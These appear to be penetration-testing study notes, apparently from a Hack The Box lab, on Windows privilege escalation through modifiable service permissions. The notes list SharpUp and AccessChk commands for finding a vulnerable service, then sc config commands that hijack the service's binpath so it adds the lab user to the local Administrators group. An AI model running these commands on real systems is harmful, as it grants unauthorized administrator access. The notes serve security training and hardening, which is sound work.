
**Concept**: you don't even need filesystem write access — if your user has `SERVICE_ALL_ACCESS` (or just enough rights) over the _service object itself_, you can repoint what it executes.

### Find it

```
SharpUp.exe audit
```

Look under "Modifiable Services."

### **Verify with AccessChk**

```
accesschk.exe /accepteula -quvcw WindscribeService
```

Red flag: `Authenticated Users` with `SERVICE_ALL_ACCESS`.

### Confirm you're not already admin

```
net localgroup administrators
```

### **Exploit — hijack binpath**

```
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

```
sc stop WindscribeService
```

```
sc start WindscribeService
```

